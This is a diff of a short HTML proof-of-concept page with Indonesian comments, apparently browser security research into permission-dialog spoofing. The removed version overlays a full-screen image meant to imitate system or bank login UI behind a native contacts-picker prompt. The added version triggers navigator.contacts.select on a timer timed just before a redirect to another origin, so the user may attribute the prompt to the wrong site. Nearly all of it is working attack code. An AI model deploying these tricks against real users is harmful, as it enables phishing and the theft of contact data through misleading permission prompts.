@@ -1,62 +1,33 @@
 <!DOCTYPE html>
 <html lang="en">
     <head>
-        <title>UI Redressing Concept</title>
+        <title>Cross-Origin Permission Test</title>
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
-        <style>
-            body, html {
-                margin: 0;
-                padding: 0;
-                height: 100%;
-                overflow: hidden; /* Mencegah scroll saat spoof aktif */
-            }         
-            #spoof {
-                width: 100%;
-                height: 100vh;
-                object-fit: fill;
-                display: none;
-                position: fixed;
-                top: 0;
-                left: 0;
-                z-index: 9999;
-            }
-            #content {
-                text-align: center;
-                padding-top: 50px;
-            }
-        </style>
         <script>
-            // Menggunakan event listener untuk menangkap klik pertama
-            window.onclick = async () => {
-                const spoofImg = document.getElementById("spoof");
-                const mainContent = document.getElementById("content");
+            window.onclick = () => {
+                // 1. Jalankan fungsi permission dengan delay
+                setTimeout(async () => {
+                    try {
+                        console.log("Memicu request kontak...");
+                        // Request ini dipicu sesaat sebelum atau saat navigasi berjalan
+                        await navigator.contacts.select(["name"], {});
+                    } catch (e) {
+                        console.log("Request gagal atau dibatalkan karena navigasi.");
+                    }
+                }, 500); // Delay 500ms agar eksekusi berdekatan dengan redirect
 
-                // Langkah 1: Tampilkan gambar spoof (masih di bawah dialog sistem nanti)
-                spoofImg.style.display = "block";
-                mainContent.style.display = "none";
-
-                try {
-                    // Langkah 2: Pemicu dialog sistem
-                    // Ini akan memaksa browser menampilkan UI native di atas konten web
-                    await navigator.contacts.select(["name"], {});
-                } catch (e) {
-                    console.log("Dialog ditutup atau dibatalkan");
-                }
-                
-                // Catatan: Tanpa Fullscreen API, bar alamat asli (URL bar) 
-                // mungkin tetap terlihat di bagian atas tergantung pada 
-                // perilaku scrolling dan versi browser.
+                // 2. Segera redirect ke origin lain
+                // Gunakan delay sedikit lebih lama pada redirect agar browser sempat memproses setTimeout pertama
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com";
+                }, 600);
             }
         </script>
     </head>  
     <body>
-        <!-- Gambar yang meniru UI sistem atau halaman bank/login -->
-        <img id="spoof" src="spoof.png.jpeg" alt="Spoof UI">
-
-        <div id="content">
-            <h1>Skenario Riset Keamanan</h1>
-            <p>Klik di mana saja untuk memicu dialog sistem dan transisi UI.</p>
+        <div style="height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center;">
+            <h1>Klik untuk Uji Cross-Origin Permission</h1>
         </div>
     </body>
 </html>
